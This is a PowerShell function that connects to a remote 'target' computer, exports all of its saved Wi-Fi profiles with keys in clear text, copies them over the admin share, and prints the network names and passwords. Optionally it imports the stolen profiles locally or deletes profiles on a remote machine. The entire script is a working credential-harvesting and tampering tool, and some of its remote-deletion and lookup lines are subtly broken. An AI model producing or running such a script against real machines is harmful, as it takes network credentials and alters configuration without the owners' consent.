Function Get-Wifi {
<#
.SYNOPSIS
    Collect wireless network info from a target machine.
.DESCRIPTION
    Get-WiFi collects XML files containing all config info of known wifi networks.
    The XML files are then exported from the target to the local machine. 
    This script can view passwords, add profiles to known networks or delete them.
.EXAMPLE
    Get-Wifi -Computer TARGETCOMPUTER 
.EXAMPLES
    Optional Params: -addWifi {Yes|NO} -removeWifi {Yes|No}
    Get-Wifi -Computer TARGETCOMPUTER -AddWifi Yes -RemoveWifi No
#>
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true, ValueFromPipelineByPropertyName = $true)]
        [ValidateScript({if (Test-Connection $_ -Count 1 -Quiet) {$true}
                         else {throw "$_ is unreachable"}
        })]
        [string]$Computer,

        [Parameter(Mandatory = $false)]
        [string]$AddWifi = "No",

        [Parameter(Mandatory = $false)]
        [string]$RemoveWifi = "No"
    )

        process {
            New-Item -path "c:\temp\wifi" -ItemType Directory | Out-Null
            Invoke-Command -ComputerName $Computer {netsh wlan show profiles}
            Pause
            Invoke-Command -ComputerName $Computer {netsh wlan export profile key=clear folder=c:\temp\wifi} 
            Robocopy "\\$Computer\C$\temp\wifi" "c:\temp\wifi" 

            $profileList = Get-ChildItem -Path "c:\temp\wifi" | Select-Object Name

            foreach ($profile in $profileList) {
                # Output wifi keys that were collected from the target
                $ssid = $profile.name.Replace("Wi-Fi-",'').Replace(".xml",'')
                $profilePath = Join-Path "C:\temp\wifi\" $profile.Name
                netsh wlan show profiles name=$profilePath key=clear | Select-String -Pattern "Key Content", "SSID name" | ForEach-Object {$_.ToString()}
       
                # Add the gathered profiles to computers known wifi networks
                if ($AddWifi -match "Yes") {
                    netsh wlan add profile filename=$profilePath user=all
                }
            }

            # Remove profiles config from a computers known wifi networks      
            if ($RemoveWifi -match "Yes") {
                $delComputer = Read-Host "enter Computer Name"
                do {
                    Invoke-Command -ComputerName $delComputer {netsh wlan show profiles}
                    $delProfile = Read-Host "enter profile name or '*' to delete all"
                    Invoke-Command -ComputerName $delComputer {netsh wlan delete profile name=$delProfile}
                    $loopControl = Read-host "enter 'y' to exit"
                }
                until ($loopControl -eq "y")  
            }
        }
}
